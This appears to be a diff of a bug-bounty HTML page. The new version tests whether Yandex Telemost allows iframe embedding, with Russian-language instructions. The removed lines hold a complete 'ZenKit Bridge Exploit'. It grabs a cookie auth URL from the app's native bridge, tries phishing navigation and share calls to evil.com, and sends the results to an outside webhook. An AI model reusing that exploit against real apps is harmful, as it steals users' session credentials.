@@ -1,103 +1,112 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZenKit Bridge Exploit</title>
-    <style>body { font-family: monospace; padding: 10px; word-wrap: break-word; }</style>
+    <title>Telemost Embed Test — Bug Bounty PoC</title>
+    <style>
+        body {
+            font-family: system-ui, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+            background: #1a1a2e;
+            color: #e0e0e0;
+        }
+        h1 { color: #ff6b6b; }
+        .info {
+            background: #16213e;
+            border-left: 4px solid #ff6b6b;
+            padding: 16px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .frame-container {
+            border: 2px dashed #ff6b6b;
+            margin: 20px 0;
+            position: relative;
+            background: #0f0f23;
+        }
+        .frame-container::before {
+            content: "iframe: telemost.yandex.ru";
+            position: absolute;
+            top: -12px;
+            left: 12px;
+            background: #1a1a2e;
+            padding: 0 8px;
+            color: #ff6b6b;
+            font-size: 12px;
+        }
+        iframe {
+            width: 100%;
+            height: 600px;
+            border: none;
+            display: block;
+        }
+        #result {
+            padding: 16px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        .blocked { background: #1b4332; color: #95d5b2; }
+        .loaded { background: #5c1a1a; color: #ff9a9a; }
+    </style>
 </head>
 <body>
-    <h1>💣 ZenKit Bridge Exploit</h1>
-    <div id="status">Waiting for bridge...</div>
-    <hr>
-    <div id="log"></div>
+    <h1>Telemost iframe Embed Test</h1>
+
+    <div class="info">
+        <strong>Цель:</strong> проверить, разрешает ли telemost.yandex.ru встраивание в iframe
+        на стороннем домене (X-Frame-Options / CSP frame-ancestors).<br>
+        <strong>Ожидаемое безопасное поведение:</strong> iframe должен быть заблокирован.
+    </div>
+
+    <p>Вставь свою ссылку на Телемост ниже:</p>
+    <input type="text" id="url-input"
+        placeholder="https://telemost.yandex.ru/j/..."
+        style="width:100%;padding:10px;font-size:14px;background:#16213e;color:#e0e0e0;border:1px solid #444;border-radius:4px;box-sizing:border-box;">
+    <br><br>
+    <button onclick="loadFrame()"
+        style="padding:10px 24px;background:#ff6b6b;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px;">
+        Загрузить в iframe
+    </button>
+
+    <div id="result"></div>
+
+    <div class="frame-container">
+        <iframe id="telemost-frame" sandbox="allow-scripts allow-same-origin allow-forms"
+            allow="camera;microphone"></iframe>
+    </div>
 
     <script>
-        // ТВОЙ ВЕБХУК (куда полетят данные)
-        var WEBHOOK = "https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV";
-
-        function sendLog(msg) {
-            // Визуально на экране
-            document.getElementById('log').innerHTML += "<div>" + msg + "</div>";
-            
-            // ОТПРАВКА ЧЕРЕЗ КАРТИНКУ (Bypass CORS)
-            // Мы кодируем сообщение в base64, чтобы спецсимволы не ломали URL
-            var img = new Image();
-            img.src = WEBHOOK + "?log=" + encodeURIComponent(btoa(msg)) + "&t=" + Math.random();
-        }
-
-        function exploit() {
-            sendLog("--- STARTING EXPLOIT ---");
-            
-            // Определяем, какой объект доступен (ZenKit или Native_ZenKit)
-            var bridge = null;
-            if (window.Native_ZenKit) {
-                bridge = window.Native_ZenKit;
-                sendLog("FOUND: Native_ZenKit");
-            } else if (window.ZenKit) {
-                bridge = window.ZenKit;
-                sendLog("FOUND: ZenKit (Wrapper)");
-            } else {
-                sendLog("ERROR: No bridge found. Are we in Zen App?");
+        function loadFrame() {
+            const url = document.getElementById('url-input').value.trim();
+            if (!url.startsWith('https://telemost.yandex.ru/')) {
+                alert('Введи валидную ссылку на telemost.yandex.ru');
                 return;
             }
+            const frame = document.getElementById('telemost-frame');
+            const result = document.getElementById('result');
 
-            // --- АТАКА 1: Попытка получить Auth URL (Самое критичное) ---
-            try {
-                sendLog("Trying requestCookieAuthURL...");
-                // Метод может вернуть строку сразу или промис
-                var result = bridge.requestCookieAuthURL();
-                
-                if (result && typeof result.then === 'function') {
-                    // Это промис
-                    result.then(function(res) {
-                        sendLog("CRITICAL (Promise): " + JSON.stringify(res));
-                    });
-                } else {
-                    // Это строка или объект
-                    sendLog("CRITICAL (Direct): " + result);
-                }
-            } catch (e) {
-                sendLog("Auth Error: " + e.message);
-            }
+            result.textContent = 'Загрузка...';
+            result.className = '';
 
-            // --- АТАКА 2: Навигация на фишинг (RCE/Phishing) ---
-            // Пробуем разные форматы аргументов, так как мы не знаем сигнатуру
-            try {
-                var target = "https://google.com"; // Замени на свой фишинг
-                sendLog("Trying navigate()...");
-                
-                // 1. Просто строка
-                bridge.navigate(target);
-                
-                // 2. JSON объект (частый паттерн)
-                bridge.navigate(JSON.stringify({url: target}));
-                
-                // 3. Объект
-                bridge.navigate({url: target});
-                
-                sendLog("Navigate called (check screen)");
-            } catch (e) {
-                sendLog("Navigate Error: " + e.message);
-            }
+            frame.src = url;
 
-            // --- АТАКА 3: Share (UI Redress) ---
-            try {
-                // Если сработает - откроется системное меню шаринга
-                bridge.share("Check this out", "https://evil.com");
-                bridge.openNativeShareMenu();
-            } catch(e) {}
+            // Если iframe заблокирован X-Frame-Options, onload всё равно
+            // срабатывает, но содержимое будет пустым.
+            // Полноценная проверка — визуальная: загрузился ли интерфейс.
+            frame.onload = function() {
+                result.textContent = 'iframe onload сработал — проверь визуально, отобразился ли интерфейс Телемоста. Если пустой белый/серый фрейм — X-Frame-Options блокирует (это хорошо).';
+                result.className = 'loaded';
+            };
 
-            // --- АТАКА 4: Чтение хедеров ---
-            try {
-                var headers = bridge.setHeaderInfo();
-                if (headers) sendLog("Headers: " + JSON.stringify(headers));
-            } catch(e) {}
+            frame.onerror = function() {
+                result.textContent = '✅ iframe заблокирован — framing запрещён.';
+                result.className = 'blocked';
+            };
         }
-
-        // Запуск с небольшой задержкой, чтобы бридж успел инициализироваться
-        setTimeout(exploit, 1500);
-
     </script>
 </body>
 </html>
